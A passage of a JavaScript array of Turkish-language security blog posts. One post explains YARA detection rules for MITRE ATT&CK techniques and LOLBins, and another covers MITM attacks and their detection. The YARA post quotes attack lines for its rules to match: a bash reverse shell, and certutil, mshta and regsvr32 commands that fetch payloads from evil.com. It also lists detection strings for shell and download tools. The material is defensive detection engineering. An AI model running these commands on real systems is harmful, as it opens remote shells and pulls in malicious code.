    <p>Şüpheli bir aktivite dikkat çektiğinde Event Search veya Advanced Event Search üzerinden derinlemesine araştırma yapılır. Bağlamı tamamlamak için Entity Management'a geçilir. Bulgular netleşince case güncellenir. Son olarak Unified Content Library'deki hazır query paketleri ile henüz alarm üretmemiş tehditlere yönelik proaktif tehdit avı yapılır.<strong> Tüm bu adımlar tek bir konsolda, platform değiştirmeden tamamlanır.</strong></p>
  `
},
      {
  id: "yara-ile-tehdit-tespiti",
  title: "YARA ile Tehdit Tespiti — MITRE ATT&CK Tekniklerine ve LOLBins'e Özel Kurallar",
  date: "16 Temmuz 2026",
  excerpt: "Bir dosya sisteminize düşüyor. AV sessiz. EDR alarm vermiyor. İşte tam bu noktada YARA devreye giriyor. 8 farklı MITRE ATT&CK tekniği için yazdığım YARA kurallarını ve arkasındaki mantığı adım adım açıklıyorum.",
  tags: ["YARA", "MITRE ATT&CK", "Detection Engineering"],
  severity: "high",
  body: `
    <img src="images/YARA.jpg" alt="YARA Diagramı" style="width:100%; background:#ffffff; padding:24px; border-radius:12px; margin:0 0 20px; display:block;">
    <h2>1. Giriş</h2>
    <p>Bir dosya sisteminize düşüyor. AV sessiz. <strong>EDR</strong> alarm vermiyor. Ama siz bir şeylerin yanlış olduğunu hissediyorsunuz. İşte tam bu noktada YARA devreye giriyor.</p>
    <p>Bu yazıda YARA'nın ne olduğunu, nasıl çalıştığını ve gerçek <strong>MITRE ATT&CK</strong> tekniklerine karşı nasıl kural yazıldığını anlatacağım. <strong>Bash reverse shell'den Squiblydoo'ya, LD_PRELOAD'dan certutil abuse'a</strong> kadar 8 farklı teknik için yazdığım kuralları ve arkasındaki mantığı adım adım açıklayacağım.</p>

    <h2>YARA Nedir?</h2>
    <p>YARA — <strong>"Yet Another Recursive Acronym"</strong> — dosya ve bellek içeriğini string, byte pattern ve mantıksal koşullarla eşleştirerek kötü amaçlı yazılımları tanımlamaya yarayan açık kaynaklı bir pattern-matching aracıdır. VirusTotal bünyesinde Victor Alvarez tarafından geliştirilmiştir.</p>
    <p>En basit tanımıyla: <strong>"Bu string bu dosyada var mı?"</strong> sorusunu soran ve buna göre alarm üreten bir araç. Ama YARA'yı güçlü kılan şey bu basitliğin ötesinde. String kombinasyonları, byte pattern'leri, dosya boyutu kontrolü, PE header analizi, regex — bunların hepsini bir arada kullanarak çok hassas ve güçlü tespit kuralları yazabiliyorsunuz.</p>

    <h2>YARA ile CrowdStrike IOA Arasındaki Fark</h2>
    <p>İkisi de tehdit tespit ediyor ama çalışma mantıkları tamamen farklı.</p>
    <p><strong>CrowdStrike IOA</strong> canlı process davranışını izliyor. Process tree'ye bakıyor, parent-child ilişkisini analiz ediyor, komut satırı argümanlarını değerlendiriyor. Kısacası bir şey <em>çalışırken</em> yakalıyor.</p>
    <p><strong>YARA</strong> ise statik analiz yapıyor. Bir dosyanın içindeki string'lere, byte dizilerine veya pattern'lere bakıyor. Dosya çalışmak zorunda değil — sadece disk üzerinde var olması yeterli. Hatta memory dump alıp bellekteki içeriği de tarayabiliyorsunuz.</p>
    <p>Bu iki yaklaşım birbirini tamamlıyor. <strong>Bir saldırgan script'ini diske yazdıysa YARA yakalar</strong>. Çalıştırdıysa <strong>IOA</strong> yakalar. İkisi birlikte kullanıldığında savunma katmanı çok daha sağlam oluyor.</p>

    <h2>YARA Kural Yapısı</h2>
    <p>Bir YARA kuralı üç ana bölümden oluşuyor: <strong>meta</strong>, <strong>strings</strong> ve <strong>condition</strong>.</p>
    <pre><code>rule RuleName {
    meta:
        description = "Kuralın amacı"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1059.004"
    strings:
        $s1 = "aranacak_string"
        $s2 = { 4D 5A 90 00 }   // hex byte pattern
        $s3 = /regex_pattern/   // regex
    condition:
        any of ($s*)
}</code></pre>
    <p><strong>meta:</strong> Kural hakkında bilgi. Zorunlu değil ama önemli — özellikle MITRE ID'si ve açıklama her zaman eklenmelidir.</p>
    <p><strong>strings:</strong> Aranacak pattern'ler. ASCII/Unicode string, hex byte pattern veya regex olarak tanımlanabilir.</p>
    <p><strong>condition:</strong> Kuralın tetikleneceği koşul. Temel operatörler: <code>any of ($s*)</code> herhangi biri eşleşirse, <code>all of ($s*)</code> tümü eşleşmeli, <code>uint16(0) == 0x5A4D</code> PE dosyası kontrolü, <code>filesize &lt; 1MB</code> dosya boyutu koşulu.</p>
    <p><strong>Not</strong>:Condition'ı doğru yazmak kural yazımının <strong>kalbidir</strong>. Çok geniş yazarsanız false positive yağmuruna tutulursunuz. Çok dar yazarsanız gerçek tehditler gözden kaçar.</p>

    <h2>Bölüm 1: MITRE ATT&CK Execution Teknikleri</h2>

    <h3>T1059.004 — Bash Reverse Shell</h3>
    <p>Saldırgan hedef sisteme bir bash scripti ulaştırır. Bu script <code>/dev/tcp</code> mekanizmasıyla saldırganın makinesine bir TCP bağlantısı açar ve bash'in stdin/stdout'unu bu bağlantıya yönlendirir. Sonuç: uzaktan interaktif shell erişimi.</p>
    <pre><code>bash -i >& /dev/tcp/10.0.0.5/4444 0>&1</code></pre>
    <p>Burada <code>-i</code> interaktif mod, <code>&gt;&amp;</code> hem stdout hem stderr'i sokete yönlendiriyor, <code>0&gt;&amp;1</code> ise stdin'i de aynı kanaldan alıyor. Saldırganın makinesi 4444 portunu dinlerken kurban makine ona bağlanıyor — tersine çalışan bir shell.</p>
    <p>Obfuscation için base64 encode sıkça kullanılıyor. Zararlı komut encode ediliyor, echo ile yazılıyor, <code>base64 -d</code> ile decode edilip pipe'la bash'e gönderiliyor.</p>
    <pre><code>rule Detect_Bash_ReverseShell_T1059_004 {
    meta:
        description = "Bash reverse shell pattern tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1059.004"
        severity    = "High"
    strings:
        $tcp    = "/dev/tcp/"   ascii
        $udp    = "/dev/udp/"   ascii
        $b64sh  = "base64 -d"   ascii
        $pipesh = "| bash"      ascii
        $pipesh2= "| sh"        ascii
        $redir  = ">& /dev/"    ascii
        $inter  = "bash -i"     ascii
    condition:
        any of ($tcp, $udp, $redir) or
        ($inter and any of ($b64sh, $pipesh, $pipesh2))
}</code></pre>
    <p><strong>Kural mantığı:</strong> <code>/dev/tcp/</code> veya <code>/dev/udp/</code> veya <code>&gt;&amp; /dev/</code> görürsen direkt alarm ver — bunların meşru kullanımı neredeyse yok. <code>bash -i</code> ile birlikte base64 decode veya pipe-to-shell kombinasyonu da alarm tetikler. Bu kuralı <code>/tmp</code> ve <code>/var/tmp</code> gibi geçici dizinlerdeki dosyalarda çalıştırmak en etkili sonucu veriyor.</p>

    <h3>T1053.003 — Cron Persistence</h3>
    <p>Cron, Linux/macOS sistemlerde zamanlanmış görevleri çalıştıran bir servistir. Saldırganlar bu servisi persistence için kullanıyor — sistem yeniden başlasa bile kötü amaçlı kod çalışmaya devam ediyor. Rocke, TeamTNT, Kinsing gibi kripto madenciliği malware aileleri ve GoldMax/Gomir gibi backdoor'lar bu tekniği aktif kullanıyor.</p>
    <p>Tehdit altındaki dosyalar: <code>/etc/crontab</code>, <code>/etc/cron.d /*</code>, <code>/var/spool/cron/crontabs/*</code></p>
    <pre><code>rule Detect_Malicious_Cron_T1053_003 {
    meta:
        description = "Crontab dosyasinda kotu amacli icerik tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1053.003"
        severity    = "Medium-High"
    strings:
        $reboot  = "@reboot"    ascii
        $curl    = "curl "      ascii
        $wget    = "wget "      ascii
        $b64     = "base64"     ascii
        $pipebsh = "| bash"     ascii
        $pipesh  = "| sh"       ascii
        $devtcp  = "/dev/tcp"   ascii
        $http    = "http://"    ascii
        $https   = "https://"   ascii
    condition:
        ($reboot and any of ($curl,$wget,$http,$https)) or
        any of ($devtcp, $pipebsh, $pipesh) or
        ($b64 and any of ($pipebsh, $pipesh))
}</code></pre>
    <p><strong>Kural mantığı:</strong> <code>@reboot</code> direktifi meşru olabilir ama yanında <code>curl</code>, <code>wget</code> veya bir URL varsa kesinlikle şüpheli. <code>/dev/tcp</code> tek başına yeterli alarm sebebi. Base64 ile pipe-to-shell kombinasyonu da güçlü bir sinyal. Paket yöneticilerinin oluşturduğu cron girişlerinden false positive gelebileceğine dikkat edin.</p>

    <h3>T1106 — Native API Abuse</h3>
    <p>EDR sistemleri genellikle user-mode API'larını hook'layarak zararlı aktiviteleri yakalıyor. Saldırganlar bu hook'ları atlatmak için doğrudan syscall kullanıyor. Linux'ta Python üzerinden örnek:</p>
    <pre><code>import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.execve(b"/bin/sh", [b"/bin/sh"], None)</code></pre>
    <p>Bu kod standart <code>subprocess</code> veya <code>os.system</code> yerine doğrudan <code>execve</code> syscall'ını çağırıyor — EDR'nin hook'larını atlıyor.</p>
    <pre><code>rule Detect_Native_API_Abuse_T1106 {
    meta:
        description = "Native API / direkt syscall kullanimi tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1106"
        severity    = "High"
    strings:
        $ctypes  = "ctypes.CDLL"    ascii
        $libc    = "libc.so"        ascii
        $execve  = "execve"         ascii
        $ptrace  = "ptrace"         ascii
        $procmem = "/proc/self/mem" ascii
        $mmap    = "mmap"           ascii
        $syscall = "syscall"        ascii
    condition:
        ($ctypes and $libc and $execve) or
        ($ptrace and $procmem) or
        ($mmap and $syscall and $execve)
}</code></pre>
    <p><strong>Kural mantığı:</strong> <code>ctypes.CDLL</code> + <code>libc.so</code> + <code>execve</code> üçlüsü Python üzerinden doğrudan syscall yapıldığının güçlü işareti. <code>ptrace</code> + <code>/proc/self/mem</code> memory injection'ı işaret ediyor. <code>ctypes</code> tek başına meşru kullanımda yaygın — bu yüzden condition kombinasyonlu tutulmuş.</p>

    <h3>T1129 — Shared Modules (LD_PRELOAD)</h3>
    <p>Linux'ta <code>LD_PRELOAD</code> environment değişkeni, bir program çalışmadan önce belirtilen shared library'yi yükler. Bu library içinde sistem fonksiyonlarıyla aynı isimde fonksiyonlar varsa orijinallerin yerini alır.</p>
    <pre><code>LD_PRELOAD=/tmp/evil.so /usr/bin/ls</code></pre>
    <p>Kullanıcı sadece <code>ls</code> gördü ama arka planda backdoor çalıştı. Sistem genelinde kalıcı hale getirmek için <code>/etc/ld.so.preload</code> dosyasına yazılıyor. Rocke malware ailesi bu tekniği aktif kullanıyor.</p>
    <pre><code>rule Detect_Malicious_SharedModule_T1129 {
    meta:
        description = "Kotu amacli .so dosyasi / LD_PRELOAD tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1129"
        severity    = "High"
    strings:
        $ldpreload = "LD_PRELOAD"         ascii
        $ldso      = "/etc/ld.so.preload" ascii
        $tmp       = "/tmp/"              ascii
        $devshm    = "/dev/shm/"          ascii
        $dlopen    = "dlopen"             ascii
        $execve    = "execve"             ascii
        $revsh     = "/dev/tcp"           ascii
        $elfmagic  = { 7F 45 4C 46 }
    condition:
        $elfmagic at 0 and
        (($ldpreload and ($tmp or $devshm)) or
         ($ldso) or
         ($dlopen and $execve) or
         ($revsh))
}</code></pre>
    <p><strong>Kural mantığı:</strong> <code>{ 7F 45 4C 46 }</code> ELF magic byte'ı — kural sadece Linux ELF binary'lerine uygulansın diye condition'ın başına eklendi, metin dosyalarında false positive üretmez. <code>/etc/ld.so.preload</code> tek başına yüksek riskli. <code>/dev/tcp</code> bir ELF binary içindeyse reverse shell kodu gömülmüş demek.</p>

    <h3>T1204.002 — User Execution: Malicious File</h3>
    <p>Sosyal mühendislik. Kullanıcı kandırılarak kötü amaçlı bir dosyayı kendisi çalıştırıyor. Linux'ta uzantı çalıştırılabilirliği belirlemez — <code>chmod +x</code> yeterli. <code>fatura.pdf.sh</code> adlı bir dosya PDF gibi görünebilir ama içinde shell script var.</p>
    <pre><code>rule Detect_MaliciousFile_UserExec_T1204_002 {
    meta:
        description = "Sahte uzantili kotu amacli script tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1204.002"
        severity    = "Medium-High"
    strings:
        $shebang  = "#!/bin/bash" ascii
        $shebang2 = "#!/bin/sh"   ascii
        $chmod    = "chmod +x"    ascii
        $curl     = "curl"        ascii
        $wget     = "wget"        ascii
        $pipesh   = "| bash"      ascii
        $pipesh2  = "| sh"        ascii
        $revsh    = "/dev/tcp"    ascii
    condition:
        any of ($shebang, $shebang2) and
        (any of ($curl, $wget, $revsh) or
         $chmod or any of ($pipesh, $pipesh2))
}</code></pre>
    <p><strong>Kural mantığı:</strong> Shebang satırı dosyanın shell script olduğunu söylüyor. Yanında <code>curl</code>, <code>wget</code>, <code>| bash</code> veya <code>/dev/tcp</code> görürsek — Downloads veya Desktop gibi kullanıcı dizinlerinden gelen bu dosya büyük ihtimalle kötü amaçlı.</p>

    <h2>Bölüm 2: LOLBins — YARA Kuralları</h2>
    <p>LOLBins için YARA farklı bir perspektiften devreye giriyor. Bu araçlar meşru olduğu için sadece varlıkları alarm vermez — ama bir batch script, scheduled task XML veya komut dosyasında şüpheli parametrelerle çağrıldıklarını görürsek tespit edebiliriz.</p>

    <h3>certutil.exe — T1140 / T1105</h3>
    <p>certutil.exe, Windows'un sertifika yönetim aracıdır. Saldırganlar <code>-urlcache</code> ile dosya indirme, <code>-decode</code> ile base64 payload açma için kötüye kullanıyor.</p>
    <pre><code>certutil -urlcache -split -f http://evil.com/payload.exe payload.exe
certutil -decode encoded.txt payload.exe</code></pre>
    <pre><code>rule Detect_Certutil_Abuse_T1140_T1105 {
    meta:
        description = "certutil.exe LOLBin kotu amacli kullanim tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1140, T1105"
        severity    = "High"
    strings:
        $certutil = "certutil"  ascii nocase
        $urlcache = "-urlcache" ascii nocase
        $decode   = "-decode"   ascii nocase
        $encode   = "-encode"   ascii nocase
        $split    = "-split"    ascii nocase
        $http     = "http://"   ascii
        $https    = "https://"  ascii
        $force    = "-f "       ascii nocase
    condition:
        $certutil and
        (($urlcache and ($http or $https)) or
         ($decode and $force) or
         ($encode and $split))
}</code></pre>
    <p><strong>Kural mantığı:</strong> <code>certutil</code> tek başına yeterli değil. <code>certutil</code> + <code>-urlcache</code> + URL görürsek şüpheli. <code>nocase</code> flag'i önemli: <code>CERTUTIL</code>, <code>CeRtUtIl</code>, <code>certutil</code> — hepsi yakalanıyor. Saldırganlar büyük/küçük harf değiştirerek basit eşleşmeleri atlatmaya çalışıyor.</p>

    <h3>mshta.exe — T1218.005</h3>
    <p>mshta.exe, HTA dosyalarını çalıştıran meşru bir Windows aracıdır. Browser güvenlik ayarlarını bypass eder, diske hiç dosya yazmadan uzaktan kod çalıştırabilir.</p>
    <pre><code>mshta.exe http://evil.com/payload.hta
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run(""malware.exe"")")
mshta.exe javascript:alert("Test");close()</code></pre>
    <pre><code>rule Detect_Mshta_Abuse_T1218_005 {
    meta:
        description = "mshta.exe LOLBin / HTA kotu amacli kullanim tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1218.005"
        severity    = "High"
    strings:
        $mshta      = "mshta"          ascii nocase
        $http       = "http://"        ascii
        $https      = "https://"       ascii
        $vbscript   = "vbscript:"      ascii nocase
        $jscript    = "javascript:"    ascii nocase
        $wshell     = "WScript.Shell"  ascii nocase
        $activex    = "ActiveXObject"  ascii nocase
        $powershell = "powershell"     ascii nocase
        $resize     = "resizeTo"       ascii
    condition:
        ($mshta and any of ($http,$https,$vbscript,$jscript)) or
        ($wshell and $activex and $powershell) or
        ($resize and $mshta)
}</code></pre>
    <p><strong>Kural mantığı:</strong> Üç farklı condition bloğu var. Birinci: <code>mshta</code> + URL veya inline script. İkinci: <code>WScript.Shell</code> + <code>ActiveXObject</code> + <code>powershell</code> — bu üçlü HTA dosyalarında neredeyse her zaman kötü amaçlı. Üçüncü: <code>resizeTo</code> + <code>mshta</code> — fidye yazılımı operatörlerinin mshta penceresini kullanıcıdan gizlemek için kullandığı 0px boyutlandırma trick'i.</p>

    <h3>regsvr32.exe — T1218.010 (Squiblydoo)</h3>
    <p>Squiblydoo, Casey Smith tarafından 2016'da keşfedilen bir AppLocker bypass tekniğidir. <code>/i:</code> parametresi bir URL alınca <code>scrobj.dll</code> o URL'deki <code>.sct</code> scriptlet dosyasını indirip çalıştırıyor. Diske hiçbir şey yazılmıyor.</p>
    <pre><code>regsvr32 /s /u /i:http://evil.com/file.sct scrobj.dll</code></pre>
    <p>Hedef <code>.sct</code> dosyası XML formatında bir scriptlet'tir ve içinde JScript veya VBScript bulunur.</p>
<pre><code>rule Detect_Regsvr32_Squiblydoo_T1218_010 {
    meta:
        description = "regsvr32 Squiblydoo / SCT scriptlet tespiti"
        author      = "Roman"
        date        = "2026-07-16"
        mitre       = "T1218.010"
        severity    = "High"
    strings:
        $regsvr32 = "regsvr32"       ascii nocase
        $scrobj   = "scrobj.dll"     ascii nocase
        $sct_tag  = "&lt;scriptlet&gt;"    ascii nocase
        $reg_tag  = "&lt;registration"  ascii nocase
        $http_i   = "/i:http"        ascii nocase
        $https_i  = "/i:https"       ascii nocase
        $jscript  = "JScript"        ascii
        $vbscript = "VBScript"       ascii
        $wshell   = "WScript.Shell"  ascii nocase
    condition:
        ($regsvr32 and $scrobj and any of ($http_i,$https_i)) or
        ($sct_tag and $reg_tag and any of ($jscript,$vbscript,$wshell))
}</code></pre>
    <p><strong>Kural mantığı:</strong> İki condition bloğu var. Birinci: <code>regsvr32</code> + <code>scrobj.dll</code> + <code>/i:http</code> — Squiblydoo komutunun kendisi. İkinci: <code>&lt;scriptlet&gt;</code> + <code>&lt;registration</code> + aktif script içeriği — doğrudan <code>.sct</code> dosyasını yakalar. Bu kombinasyon neredeyse her zaman Squiblydoo veya benzeri bir tekniğin eseridir.</p>
    <h2>YARA Kurallarını Çalıştırmak</h2>
    <p>Tek dosyayı taramak için:</p>
    <pre><code>yara kural.yar hedef_dosya.sh</code></pre>
    <p>Bir dizini recursive olarak taramak için:</p>
    <pre><code>yara -r kural.yar /tmp/</code></pre>
    <p>Eşleşen string'leri de görmek için:</p>
    <pre><code>yara -s kural.yar hedef.exe</code></pre>
    <p>CrowdStrike Falcon da kendi custom YARA motorunu destekliyor. Yukarıdaki kuralları Falcon konsoluna aktararak tüm sensörlü makinelerde otomatik tarama yapabilirsiniz.</p>

    <h2>Sonuç</h2>
    <p>8 kural, 8 farklı teknik. Ama hepsinin arkasında aynı felsefe var: <strong>spesifik hash veya dosya adına değil, davranış pattern'ine odaklan.</strong></p>
    <p>Bir saldırgan yarın yeni bir certutil versiyonu kullanabilir — hash değişir. Ama <code>-urlcache</code> parametresi değişmez. Bir reverse shell bin türlü obfuscate edilebilir — ama <code>/dev/tcp/</code> string'i her seferinde orada olacak.</p>
    <p>İyi bir YARA kuralı şu soruya cevap verir: <em>Bu tekniğin değişmeyecek olan bileşeni nedir?</em></p>
    <p>Condition kombinasyonları ise false positive ile false negative arasındaki dengeyi kuruyor. Çok geniş yazarsanız alarm gürültüsüne boğulursunuz. Çok dar yazarsanız gerçek tehditler gözden kaçar. Bu dengeyi bulmak kural yazımının en zor ve en kritik kısmı.</p>
  `
},
  {
  id: "MITM",
  title: "Görünmeyen Üçüncü Kişi Man-in-the-Middle (MITM) Saldırıları",
  date: "13 Ocak 2026",
  excerpt: "MITM saldırılarının gerçekleşme kriterleri, saldırı türleri, tespit yöntemleri ve alınabilecek önlemler üzerine bir inceleme.",
  tags: ["Network Security", "Blue Team"],
  severity: "medium",
  body: `
    <img src="images/MITM.png" alt="MITM saldırı diyagramı" style="width:100%; background:#ffffff; padding:24px; border-radius:12px; margin:0 0 20px; display:block;">

    <h2>1. Giriş</h2>
    <p>Man-in-the-Middle (MITM) saldırıları, saldırganın iki taraf arasındaki iletişime gizlice dahil olarak veri dinlemesi, değiştirmesi veya yönlendirmesi esasına dayanan siber saldırı türleridir. Bu saldırılar genellikle ağ güvenliğindeki zayıflıklardan, yanlış yapılandırmalardan ve kullanıcı farkındalığı eksikliğinden faydalanılarak gerçekleştirilir.</p>
    <p>Bu bölümde MITM saldırılarının hangi kriterlere göre yapıldığı, kullanılan yöntemler, gerçekçi saldırı senaryoları ve SOC tarafında bu saldırıların nasıl tespit edilebileceği ele alınmıştır.</p>

    <h2>2. MITM Saldırılarının Gerçekleşme Kriterleri</h2>

    <h3>2.1 Ağ Konumuna Göre (Network Position)</h3>
    <p>MITM saldırılarının en temel gereksinimi, saldırganın hedef ile iletişim kurulan ağ arasında yer alabilmesidir. Bu durum genellikle aynı yerel ağda (LAN) bulunan sistemlerde görülür.</p>
    <p><strong>Örnek Senaryo:</strong> Bir yurt veya kafe ortamında kullanıcı ve saldırgan aynı Wi-Fi ağına bağlıdır. Saldırgan ARP Spoofing yöntemi ile kendisini gateway gibi göstererek trafiği kendi üzerinden geçirir.</p>
    <p><strong>Evil Twin / Sahte Erişim Noktası (Rogue AP):</strong> Saldırganın aynı ağa sızmasına dahi gerek kalmayabilir. Meşru bir Wi-Fi ağının SSID'sini (örneğin "Kafe_WiFi") birebir taklit eden sahte bir erişim noktası kurarak kullanıcıların bilmeden kendi cihazına bağlanmasını sağlayabilir. Bu durumda tüm trafik doğrudan saldırganın kontrolünden geçer, ayrıca ARP Spoofing gibi ek bir tekniğe gerek kalmaz.</p>

    <h3>2.2 Kullanılan Protokole Göre</h3>
    <p>Kullanılan ağ protokolünün şifreli olup olmaması MITM saldırısının başarısını doğrudan etkiler.</p>
    <p><strong>Şifrelenmemiş Protokoller:</strong></p>
    <ul>
      <li>HTTP</li>
      <li>FTP</li>
      <li>Telnet</li>
      <li>POP3</li>
    </ul>
    <p>Bu protokollerde iletilen veriler açık metin olarak aktarıldığından saldırgan tarafından kolayca okunabilir.</p>
    <p><strong>Şifreli Ancak Zayıf Yapılandırılmış Protokoller:</strong></p>
    <ul>
      <li>HTTPS (SSL Stripping)</li>
      <li>SSH — asıl risk, host key doğrulamasının kullanıcı tarafından düşünmeden kabul edilmesinden kaynaklanır (ör. "are you sure you want to continue connecting?" uyarısının fark edilmeden geçilmesi). Zayıf parola veya anahtar yönetimi bu riski büyütür ama tek başına neden değildir.</li>
    </ul>

    <h3>2.3 Altyapı Servislerine Göre</h3>
    <p>MITM saldırıları yalnızca uygulama katmanında değil, ağ altyapısında çalışan servisler hedef alınarak da gerçekleştirilebilir.</p>
    <p><strong>Yaygın Altyapı Tabanlı MITM Türleri:</strong></p>
    <ul>
      <li>ARP Spoofing</li>
      <li>DNS Spoofing</li>
      <li>DHCP Spoofing</li>
      <li>ICMP Redirect</li>
      <li>LLMNR / NBT-NS Poisoning — özellikle Windows tabanlı kurumsal ortamlarda yaygın görülen, DNS çözümlemesi başarısız olduğunda devreye giren yerel isim çözümleme protokollerinin (LLMNR, NBT-NS) sahte yanıtlarla kötüye kullanılmasına dayanır. Responder gibi araçlarla kimlik bilgisi (hash) yakalamak için sıkça kullanılır.</li>
    </ul>
    <p><strong>Örnek:</strong> Saldırgan sahte bir DHCP sunucusu kurarak kullanıcılara yanlış gateway bilgisi dağıtır ve trafiği kendi sistemi üzerinden geçirir.</p>

    <h3>2.4 Kullanıcı Davranışlarına Göre</h3>
    <p>MITM saldırılarının başarılı olmasında kullanıcı hataları önemli rol oynar.</p>
    <p><strong>Riskli Davranışlar:</strong></p>
    <ul>
      <li>HTTPS sertifika uyarılarının dikkate alınmaması</li>
      <li>Halka açık Wi-Fi ağlarının kullanılması</li>
      <li>VPN kullanılmaması</li>
      <li>Sahte sertifikaların kabul edilmesi</li>
    </ul>

    <h2>3. MITM Saldırı Türleri</h2>

    <h3>3.1 Ağ Seviyesi MITM</h3>
    <ul>
      <li>ARP Poisoning</li>
      <li>DHCP Spoofing</li>
      <li>DNS Spoofing / LLMNR-NBT-NS Poisoning</li>
    </ul>

    <h3>3.2 Taşıma Seviyesi MITM</h3>
    <ul>
      <li>TCP Session Hijacking</li>
      <li>SSL Stripping</li>
    </ul>

    <h3>3.3 Uygulama Seviyesi MITM</h3>
    <ul>
      <li>Sahte giriş sayfaları</li>
      <li>HTTPS'den HTTP'ye düşürme (Downgrade Attack)</li>
      <li>Evil Twin / Sahte Erişim Noktası</li>
    </ul>

    <h2>4. MITM Saldırı Senaryosu Örneği</h2>
    <p>Bir kullanıcı halka açık bir Wi-Fi ağı üzerinden HTTP protokolü kullanan bir web sitesine giriş yapar. Aynı ağda bulunan saldırgan ARP Spoofing yöntemiyle trafiği dinler ve kullanıcının oturum bilgilerini ele geçirir. Bu bilgiler kullanılarak kullanıcının hesabına yetkisiz erişim sağlanır.</p>

    <h2>5. Tespit (Detection) Perspektifi</h2>
    <p>MITM saldırıları önleme kadar tespit açısından da önemlidir. SOC tarafında dikkat edilmesi gereken bazı göstergeler şunlardır:</p>
    <ul>
      <li>Aynı IP adresine kısa sürede birden fazla farklı MAC adresi eşlenmesi (ARP tablosu anormallikleri)</li>
      <li>Gateway MAC adresinde ani ve açıklanamayan değişiklikler</li>
      <li>Ağda beklenmedik, yetkisiz DHCP sunucu yanıtları</li>
      <li>Yoğun LLMNR/NBT-NS trafiği veya bilinen saldırı araçlarına ait imzalar (ör. Responder)</li>
      <li>Sertifika uyuşmazlıkları veya beklenmedik self-signed sertifika kullanımı</li>
      <li>Aynı ağda birden fazla SSID'nin aynı isimle yayın yapması (Evil Twin göstergesi)</li>
    </ul>
    <p>Bu tür göstergeler SIEM ve EDR çözümleri üzerinden korelasyon kurallarıyla izlenebilir ve erken aşamada tespit edilerek saldırının etkisi sınırlandırılabilir.</p>

    <h2>6. MITM Saldırılarına Karşı Önlemler</h2>
    <ul>
      <li>HTTPS ve HSTS kullanımı</li>
      <li>VPN ile ağ trafiğinin şifrelenmesi</li>
      <li>ARP ve DHCP koruma mekanizmaları (Dynamic ARP Inspection, DHCP Snooping)</li>
      <li>Sertifika doğrulama kontrolleri ve Certificate Pinning</li>
      <li>Güçlü parola ve anahtar politikaları</li>
      <li>802.1X / Network Access Control (NAC) ile yetkisiz cihazların ağa erişiminin engellenmesi</li>
      <li>DNSSEC kullanımı</li>
    </ul>

    <h2>7. Sonuç</h2>
    <p>MITM saldırıları, ağ güvenliği açısından ciddi riskler oluşturmaktadır. Özellikle şifreleme kullanılmayan veya yanlış yapılandırılmış protokoller ve altyapı servisleri bu saldırılara zemin hazırlamaktadır. Güvenli yapılandırmalar, doğru tespit mekanizmaları ve kullanıcı farkındalığı, MITM saldırılarına karşı en etkili savunma yöntemidir.</p>
  `
}
  ];
